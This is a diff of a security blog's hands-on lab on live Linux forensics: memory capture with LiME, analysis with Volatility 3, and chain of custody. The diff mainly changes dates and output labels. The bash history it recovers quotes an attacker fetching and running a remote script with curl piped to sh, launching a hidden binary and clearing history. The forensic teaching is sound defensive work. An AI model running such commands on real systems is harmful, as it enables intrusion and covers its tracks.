@@ -41,12 +41,12 @@
     <link rel="help" href="../../../humans.txt">
   <link rel="security" href="../../../.well-known/security.txt">
 <link rel="manifest" href="../../../site.webmanifest">
-  <script type="application/ld+json">{"@context": "https://schema.org", "@type": ["TechArticle", "LearningResource"], "headline": "Live Box Forensics: Volatile Evidence Collection", "author": {"@type": "Person", "@id": "https://tyfsadik.org/#person", "name": "MD. Taki Yasir Faraji Sadik", "url": "https://tyfsadik.org/about.html", "sameAs": ["https://github.com/TYFSADIK"]}, "datePublished": "2025-06-03", "dateModified": "2026-09-29", "proficiencyLevel": "Advanced", "dependencies": "Volatility 3, LiME, lsof, RFC 3227", "articleSection": "Security", "learningResourceType": "Hands-on lab", "teaches": "cybersecurity and security operations", "speakable": {"@type": "SpeakableSpecification", "cssSelector": [".lead", ".faq"]}, "keywords": ["live forensics", "memory forensics", "LiME", "Volatility 3", "RFC 3227", "volatile evidence", "malfind", "live box forensics explained", "live forensics lab", "live forensics guide", "live forensics tutorial", "live forensics explained", "live forensics homelab", "memory forensics lab"], "about": [{"@type": "Thing", "name": "Animation"}, {"@type": "Thing", "name": "DNS"}, {"@type": "Thing", "name": "HTML"}, {"@type": "Thing", "name": "Linux"}, {"@type": "Thing", "name": "Nginx"}]}</script>
+  <script type="application/ld+json">{"@context": "https://schema.org", "@type": ["TechArticle", "LearningResource"], "headline": "Live Box Forensics: Volatile Evidence Collection", "author": {"@type": "Person", "@id": "https://tyfsadik.org/#person", "name": "MD. Taki Yasir Faraji Sadik", "url": "https://tyfsadik.org/about.html", "sameAs": ["https://github.com/TYFSADIK"]}, "datePublished": "2025-06-03", "dateModified": "2026-11-14", "proficiencyLevel": "Advanced", "dependencies": "Volatility 3, LiME, lsof, RFC 3227", "articleSection": "Security", "learningResourceType": "Hands-on lab", "teaches": "cybersecurity and security operations", "speakable": {"@type": "SpeakableSpecification", "cssSelector": [".lead", ".faq"]}, "keywords": ["live forensics", "memory forensics", "LiME", "Volatility 3", "RFC 3227", "volatile evidence", "malfind", "live box forensics explained", "live forensics lab", "live forensics guide", "live forensics tutorial", "live forensics explained", "live forensics homelab", "memory forensics lab"], "about": [{"@type": "Thing", "name": "Animation"}, {"@type": "Thing", "name": "DNS"}, {"@type": "Thing", "name": "HTML"}, {"@type": "Thing", "name": "Linux"}, {"@type": "Thing", "name": "Nginx"}]}</script>
   <meta property="og:title" content="Live Box Forensics Explained: Security Lab | TYFSADIK">
   <meta property="og:description" content="Capture live forensic evidence the right way: order-of-volatility collection, LiME memory imaging, Volatility 3 analysis, and chain-of-custody discipline.">
   <meta property="og:type" content="article">
   <meta property="article:published_time" content="2026-09-30T00:00:00-04:00">
-  <meta property="article:modified_time" content="2026-10-22T05:41:50-04:00">
+  <meta property="article:modified_time" content="2026-11-14T00:00:00-05:00">
   <meta property="og:url" content="https://tyfsadik.org/blog/labs/security/live-box-forensics.html">
   <meta property="og:site_name" content="TYFSADIK">
   <meta property="article:tag" content="live forensics">
@@ -150,7 +150,7 @@
 
     <nav class="breadcrumb" aria-label="Breadcrumb"><a href="../../../index.html">Home</a> &rsaquo; <a href="../../../blog/labs/index.html">Labs</a> &rsaquo; <a href="../../../blog/labs/security/index.html">Security</a> &rsaquo; <span>Live Box Forensics</span></nav>
     <div class="page-header"><h1>Live Box Forensics: Volatile Evidence Collection on a Running Host</h1>
-      <p class="byline">Written by <a href="../../../about.html">Taki Sadik</a> &middot; Last updated <time datetime="2026-10-22">2026-10-22</time> &middot; 22 min read</p>
+      <p class="byline">Written by <a href="../../../about.html">Taki Sadik</a> &middot; Last updated <time datetime="2026-11-14">2026-11-14</time> &middot; 22 min read</p>
       <div class="lab-meta"><span class="difficulty difficulty-advanced">Advanced</span><span class="lab-category">Security</span><span class="lab-time">~6 hours</span></div>
       <div class="tags" style="margin-top:0.75rem;"><span class="tag">Volatility 3</span><span class="tag">LiME</span><span class="tag">lsof</span><span class="tag">RFC 3227</span></div>
     </div>    <nav class="lab-toc" aria-label="On this page"><strong>On this page</strong>
@@ -217,27 +217,30 @@ flowchart LR
       <p>A few details behind each requirement matter more than the list suggests. First, work on a copy of the compromised VM if you can (take a hypervisor snapshot or clone) so you can experiment without contaminating the original. Second, LiME is a loadable kernel module, and kernel modules are compiled against a <em>specific</em> kernel build, a module built for 5.15.0-91-generic will refuse to load on 5.15.0-92-generic. Third, Volatility 3 needs an Intermediate Symbol Format (ISF) file for that same kernel; without it every plugin fails with symbol errors. Finally, the evidence drive should be a dedicated external drive, mounted read-write on its own mountpoint and used only as the collection destination, so the act of collecting evidence cannot overwrite the victim's disk. "Write protection" here means the destination is never the victim's own filesystem, not a read-only mount: a read-only-mounted drive cannot receive the memory image at all. Hardware write-blockers are for <em>source</em> disks you must not alter, not for the destination drive.</p>
       <p>Before touching anything, record the exact kernel and toolchain versions. This output goes straight into the case notes because it determines which LiME build and which ISF file you need:</p>
       <div class="command-block"><div class="command"><code>uname -a &amp;&amp; cat /etc/os-release | head -2 &amp;&amp; gcc --version | head -1</code></div></div>
-<pre><code class="language-bash">Linux websrv01 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux
+      <p class="lab-output-label">Example output (not re-run: it needs the compromised VM and a LiME module built for its kernel):</p>
+<pre><code>Linux websrv01 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux
 PRETTY_NAME="Ubuntu 22.04.3 LTS"
 gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0</code></pre>
       <p>On the analysis workstation (a separate, clean machine), confirm the tooling is installed and note the Volatility version, plugin names differ between Volatility 2 and 3, and everything below assumes Volatility 3:</p>
       <div class="command-block"><div class="command"><code>vol --version &amp;&amp; ls volatility3/symbols/linux/</code></div></div>
-<pre><code class="language-bash">Volatility 3 Framework 2.7.0
+      <p class="lab-output-label">Example output (not re-run: it needs the compromised VM and a LiME module built for its kernel):</p>
+<pre><code>Volatility 3 Framework 2.7.0
 Ubuntu-5.15.0-91-generic.json.xz</code></pre>
       <p><strong>Common mistake:</strong> installing tools on the victim machine itself. Every package you install writes to the disk you may later need to image and can stomp on unallocated space containing deleted evidence. Bring a known-good toolkit on removable media, or better, collect live state with the minimal built-in tools and do all heavy analysis offline.</p>
           </div>
 </section>
 
     <section id="step-by-step-execution"><h2>Step-by-Step Execution</h2>
+      <p class="lab-step-note lab-rerun-note">The steps on this page were not re-run on 14 November 2026: it needs the compromised VM and a LiME module built for its kernel. The outputs shown are examples from the original lab environment, and each is marked as such.</p>
 
       <h3>0. Stage evidence media and start the chain of custody</h3>
       <p>Before collecting a single byte, mount the evidence drive and create a case directory structure. Everything you produce lands here, and every file gets hashed the moment it is created. The custody log is a plain text file recording who collected what, when, and the hash of each artifact, it is what makes the evidence defensible later.</p>
       <div class="command-block"><div class="command"><code>mkdir -p /mnt/evidence/case-2025-014/{live,memory,hashes} &amp;&amp; cd /mnt/evidence/case-2025-014</code></div></div>
-<p class="lab-output-label">Expected output:</p>
+<p class="lab-output-label">Example output (not re-run: it needs the compromised VM and a LiME module built for its kernel):</p>
 <pre><code>(no output on success)</code></pre>
 
       <div class="command-block"><div class="command"><code>echo "$(date -u) collection start, operator: tsadik, host: websrv01" | tee custody.log</code></div></div>
-<p class="lab-output-label">Expected output:</p>
+<p class="lab-output-label">Example output (not re-run: it needs the compromised VM and a LiME module built for its kernel):</p>
 <pre><code>(no output on success)</code></pre>
 
       <p>Note the <code>date -u</code>: always timestamp in UTC. Mixing local time and UTC across log entries is a classic way to make a timeline unbuildable later.</p>
@@ -247,17 +250,19 @@ Ubuntu-5.15.0-91-generic.json.xz</code></pre>
       <div class="command-block"><div class="command"><code>ss -tunap &gt; live/connections.txt &amp;&amp; lsof -n &gt; live/openfiles.txt</code></div></div>
       <div class="command-block"><div class="command"><code>ip neigh show &gt; live/arp.txt &amp;&amp; ip route show &gt; live/routes.txt</code></div></div>
       <p>Expected output in <code>connections.txt</code> (abridged), note the ESTABLISHED session from a worker process to an external IP on port 443:</p>
-<p class="lab-output-label">Expected output:</p>
+<p class="lab-output-label">Example output (not re-run: it needs the compromised VM and a LiME module built for its kernel):</p>
 <pre><code class="language-bash">Netid State  Recv-Q Send-Q Local Address:Port   Peer Address:Port  Process
 tcp   ESTAB  0      0      10.0.2.15:443        203.0.113.44:51822 users:(("nginx",pid=1180,fd=6))
 tcp   ESTAB  0      0      10.0.2.15:41990      198.51.100.77:443  users:(("kworker/u8:2",pid=4412,fd=11))</code></pre>
       <p>That second line is the anomaly that anchors the whole investigation: a kernel-thread-named process holding a userspace TCP socket to an unfamiliar IP. Legitimate kworkers do not open outbound TLS sessions. Next, snapshot the process list and open-file table so you can correlate PIDs across sources:</p>
       <div class="command-block"><div class="command"><code>ps auxww &gt; live/ps.txt &amp;&amp; lsof -nP &gt; live/lsof.txt</code></div></div>
-<pre><code class="language-bash">root  4412  0.0  0.0  0  0 ?  S  14:02  0:00 [kworker/u8:2]</code></pre>
+      <p class="lab-output-label">Example output (not re-run: it needs the compromised VM and a LiME module built for its kernel):</p>
+<pre><code>root  4412  0.0  0.0  0  0 ?  S  14:02  0:00 [kworker/u8:2]</code></pre>
       <p>Before leaving live state, grab the remaining volatile system context: who is logged in, which kernel modules are loaded (rootkits often show up here), what is mounted, and what scheduled jobs exist. These all change constantly on a busy box and some of them vanish entirely on reboot.</p>
       <div class="command-block"><div class="command"><code>who -a &gt; live/logins.txt; w &gt;&gt; live/logins.txt; last -20 &gt;&gt; live/logins.txt</code></div></div>
       <div class="command-block"><div class="command"><code>lsmod &gt; live/modules.txt &amp;&amp; mount &gt; live/mounts.txt &amp;&amp; crontab -l &gt; live/cron-root.txt 2&gt;/dev/null</code></div></div>
-<pre><code class="language-bash"># live/logins.txt
+      <p class="lab-output-label">Example output (not re-run: it needs the compromised VM and a LiME module built for its kernel):</p>
+<pre><code># live/logins.txt
 root     pts/0        2025-06-03 14:02   198.51.100.77
 # live/modules.txt (abridged, captured before LiME was ever loaded)
 x_tables               40960  1
@@ -269,7 +274,7 @@ iptable_filter         16384  1</code></pre>
       <p>LiME (Linux Memory Extractor) is a loadable kernel module that copies physical RAM out through the kernel itself, which is far more complete and less invasive than userland tricks like reading <code>/dev/mem</code> (which is restricted on modern kernels anyway). The catch: it must be compiled against the running kernel's headers. In a lab, build it on an identical VM and copy the resulting <code>.ko</code> to the target on trusted media.</p>
       <div class="command-block"><div class="command"><code>git clone https://github.com/504ensicsLabs/LiME.git &amp;&amp; cd LiME/src</code></div></div>
       <div class="command-block"><div class="command"><code>make # produces lime-5.15.0-91-generic.ko</code></div></div>
-<p class="lab-output-label">Expected output:</p>
+<p class="lab-output-label">Example output (not re-run: it needs the compromised VM and a LiME module built for its kernel):</p>
 <pre><code class="language-bash">make -C /lib/modules/5.15.0-91-generic/build M=$PWD modules
   CC [M]  lime.o
   LD [M]  lime.ko</code></pre>
@@ -280,7 +285,7 @@ iptable_filter         16384  1</code></pre>
       <div class="command-block"><div class="command"><code>sudo insmod lime.ko "path=/mnt/evidence/case-2025-014/memory/mem.lime format=lime"</code></div></div>
       <p>There is no stdout on success, verify completion via the kernel ring buffer and the file size. Expect the image to land a few hundred megabytes <em>under</em> installed RAM: LiME only acquires usable memory ranges and adds its own range headers, so a 4 GB system producing a 3.6-3.8 GB image is normal, while a 2.1 GB image means the acquisition was interrupted:</p>
       <div class="command-block"><div class="command"><code>dmesg | tail -3 &amp;&amp; ls -lh /mnt/evidence/case-2025-014/memory/mem.lime</code></div></div>
-<p class="lab-output-label">Expected output:</p>
+<p class="lab-output-label">Example output (not re-run: it needs the compromised VM and a LiME module built for its kernel):</p>
 <pre><code class="language-bash">[ 8421.311] LiME - Acquiring memory...
 [ 8462.904] LiME - Memory acquisition complete.
 -rw------- 1 root root 3.7G Jun  3 14:31 mem.lime</code></pre>
@@ -291,18 +296,20 @@ iptable_filter         16384  1</code></pre>
 <h3>4. Analyze with Volatility 3</h3>
       <p>Copy the memory image to the analysis workstation. First confirm Volatility recognizes the image and picks up the correct symbol table, the <code>banners</code> plugin reads the kernel banner string from RAM, which is your ground truth for the kernel version:</p>
       <div class="command-block"><div class="command"><code>vol -f mem.lime banners.Banners</code></div></div>
-<p class="lab-output-label">Expected output:</p>
+<p class="lab-output-label">Example output (not re-run: it needs the compromised VM and a LiME module built for its kernel):</p>
 <pre><code class="language-bash">Offset  Banner
 0x...   Linux version 5.15.0-91-generic (buildd@...) #101-Ubuntu SMP</code></pre>
       <p>With symbols resolving, enumerate the process list and then hunt for injected code. <code>linux.pslist</code> walks the kernel's task list; <code>linux.malfind</code> flags memory regions that are writable <em>and</em> executable but not backed by any file on disk, the classic signature of process injection (MITRE T1055). Treat a malfind hit as suspicious, not conclusive: some legitimate runtimes (JIT compilers, certain interpreters) also allocate RWX pages, so the hit is what gets investigated next, not the verdict:</p>
       <div class="command-block"><div class="command"><code>vol -f mem.lime linux.pslist &amp;&amp; vol -f mem.lime linux.malfind</code></div></div>
-<pre><code class="language-bash">PID  PPID  COMM        malfind: 0x7f.. RWX anomalous region in pid 4412
+      <p class="lab-output-label">Example output (not re-run: it needs the compromised VM and a LiME module built for its kernel):</p>
+<pre><code>PID  PPID  COMM        malfind: 0x7f.. RWX anomalous region in pid 4412
 4412 1     [kworker]   suspicious injected page detected</code></pre>
       <p>Two red flags in one row: the RWX region in a process named <code>[kworker]</code>, and a PPID of 1, a real kernel worker is spawned by <code>kthreadd</code> (PID 2), not by init. This is a userspace process masquerading as a kernel thread. Next, pull the in-memory network view to corroborate the live <code>ss</code> capture, and dump the suspicious region for offline analysis:</p>
       <div class="command-block"><div class="command"><code>vol -f mem.lime linux.sockstat | grep -i 4412</code></div></div>
-<pre><code class="language-bash">AF_INET  4412  kworker/u8:2  10.0.2.15:41990  198.51.100.77:443  ESTABLISHED</code></pre>
+      <p class="lab-output-label">Example output (not re-run: it needs the compromised VM and a LiME module built for its kernel):</p>
+<pre><code>AF_INET  4412  kworker/u8:2  10.0.2.15:41990  198.51.100.77:443  ESTABLISHED</code></pre>
       <div class="command-block"><div class="command"><code>vol -f mem.lime linux.malfind --pid 4412 --dump</code></div></div>
-<p class="lab-output-label">Expected output:</p>
+<p class="lab-output-label">Example output (not re-run: it needs the compromised VM and a LiME module built for its kernel):</p>
 <pre><code>Volatility 3 Framework
 Symbol table loaded: Ubuntu-5.15.0-91-generic.json
 Dumped 3 VAD regions for pid 4412</code></pre>
@@ -311,7 +318,8 @@ Dumped 3 VAD regions for pid 4412</code></pre>
       <div class="command-block"><div class="command"><code>vol -f mem.lime -o dumps linux.pslist.PsList --pid 4412 --dump</code></div></div>
       <p>Two more plugins round out the picture. First, the process tree confirms the parentage anomaly visually, <code>linux.pstree</code> indents children under their parents, and a bracketed "kernel thread" hanging directly off PID 1 stands out immediately:</p>
       <div class="command-block"><div class="command"><code>vol -f mem.lime linux.pstree | head -20</code></div></div>
-<pre><code class="language-bash">PID  PPID  COMM
+      <p class="lab-output-label">Example output (not re-run: it needs the compromised VM and a LiME module built for its kernel):</p>
+<pre><code>PID  PPID  COMM
 1    0     systemd
 * 4412 1    [kworker]
 * 1180 1    nginx
@@ -320,7 +328,8 @@ Dumped 3 VAD regions for pid 4412</code></pre>
 * 103  2    kworker/u8:1</code></pre>
       <p>Compare the two kworker entries: the legitimate one (PID 87) is a child of <code>kthreadd</code> (PID 2), while the impostor (PID 4412) is a child of init. Second, recover the attacker's shell history from memory. Interactive shells keep their command history in a heap buffer even when the on-disk <code>.bash_history</code> has been deleted or the session never wrote it out, the <code>linux.bash</code> plugin carves those buffers straight out of the image:</p>
       <div class="command-block"><div class="command"><code>vol -f mem.lime linux.bash.Bash | tail -8</code></div></div>
-<pre><code class="language-bash">PID      Process   CommandTime        Command
+      <p class="lab-output-label">Example output (not re-run: it needs the compromised VM and a LiME module built for its kernel):</p>
+<pre><code>PID      Process   CommandTime        Command
 -------  --------  -----------------  -------
 3620     bash      2025-06-03 13:58   curl http://198.51.100.77/s.sh | sh
 3620     bash      2025-06-03 13:59   setsid /dev/shm/.x &amp;
@@ -328,13 +337,14 @@ Dumped 3 VAD regions for pid 4412</code></pre>
 3620     bash      2025-06-03 14:01   history -c</code></pre>
       <p>This is the intrusion narrative in four lines: a stager pulled over HTTP, executed from a world-writable directory, launched detached with <code>setsid</code> (which explains the PPID of 1), the on-disk copy deleted immediately, and the history buffer cleared, which failed, because <code>history -c</code> only scrubs the file on exit and the heap copy survived in RAM. Finally, scan the dumped injected region with YARA to classify it:</p>
       <div class="command-block"><div class="command"><code>sha256sum dumps/pid.4412.vad.0x7f*.dmp &amp;&amp; yara rules/fileless.yar dumps/</code></div></div>
-<pre><code class="language-bash">4c9a...f21d  dumps/pid.4412.vad.0x7f3a0000.dmp
+      <p class="lab-output-label">Example output (not re-run: it needs the compromised VM and a LiME module built for its kernel):</p>
+<pre><code>4c9a...f21d  dumps/pid.4412.vad.0x7f3a0000.dmp
 generic_reverse_shell_payload dumps/pid.4412.vad.0x7f3a0000.dmp</code></pre>
       <p><strong>How to verify:</strong> a Volatility run that returns an empty process list or floods you with symbol errors almost always means the wrong ISF for the kernel version, re-check <code>banners.Banners</code> output against the JSON file name in your symbols directory. A healthy pslist on a small VM shows on the order of 100-200 processes; a handful of rows or a crash means stop and fix symbols before interpreting anything.</p>
 <p class="lab-step-note">What this teaches: Volatility reconstructs processes and memory regions from the raw image, revealing what the disk never recorded.</p>
 <h3>5. Document indicators and hand off</h3>
       <p>Findings are only useful if they are recorded in a form the next analyst (or a lawyer) can act on. Write up the indicators of compromise with their evidence sources while the details are fresh:</p>
-<p class="lab-output-label">Expected output:</p>
+<p class="lab-output-label">Example output (not re-run: it needs the compromised VM and a LiME module built for its kernel):</p>
 <pre><code class="language-bash"># case-2025-014 IOCs
 198.51.100.77:443  C2 endpoint   ss live capture + linux.sockstat (PID 4412)
 4c9a...f21d        inject dump   linux.malfind RWX region, YARA: reverse_shell
@@ -344,7 +354,7 @@ generic_reverse_shell_payload dumps/pid.4412.vad.0x7f3a0000.dmp</code></pre>
 <h3>6. Close out the custody record</h3>
       <p>After the last artifact is collected, hash everything, append a closing timestamp to the custody log, and unmount the evidence drive. From this point on, every time the image moves or is analyzed, the hash is re-verified first.</p>
       <div class="command-block"><div class="command"><code>sha256sum memory/mem.lime &gt;&gt; hashes/memory.sha256 &amp;&amp; echo "$(date -u) collection complete" &gt;&gt; custody.log</code></div></div>
-<p class="lab-output-label">Expected output:</p>
+<p class="lab-output-label">Example output (not re-run: it needs the compromised VM and a LiME module built for its kernel):</p>
 <pre><code>memory/mem.lime: SHA-256 recorded
 collection complete: timestamps logged in custody.log</code></pre>
 <p class="lab-step-note">What this teaches: closing the custody record formally ends the collection phase and its integrity guarantees.</p>
@@ -367,7 +377,7 @@ flowchart LR
     <section id="validation-testing"><h2>Validation &amp; Testing</h2>
       <p>Hash the memory image immediately after capture and again before analysis to prove integrity. Pass criteria: identical SHA-256 hashes, a complete process list, and at least one corroborated indicator between netstat and Volatility output.</p>
       <div class="command-block"><div class="command"><code>sha256sum memory/mem.lime | tee hashes/memory.sha256</code></div></div>
-<p class="lab-output-label">Expected output:</p>
+<p class="lab-output-label">Example output (not re-run: it needs the compromised VM and a LiME module built for its kernel):</p>
 <pre><code>9f2d8a1c4b6e3f0a5d7c8b9e1f2a3d4c5b6a79808192a3b4c5d6e7f8091a2b3c  memory/mem.lime</code></pre>
 
       <p>The validation is not just the hash check. Three independent tests have to pass before I trusted the findings:</p>
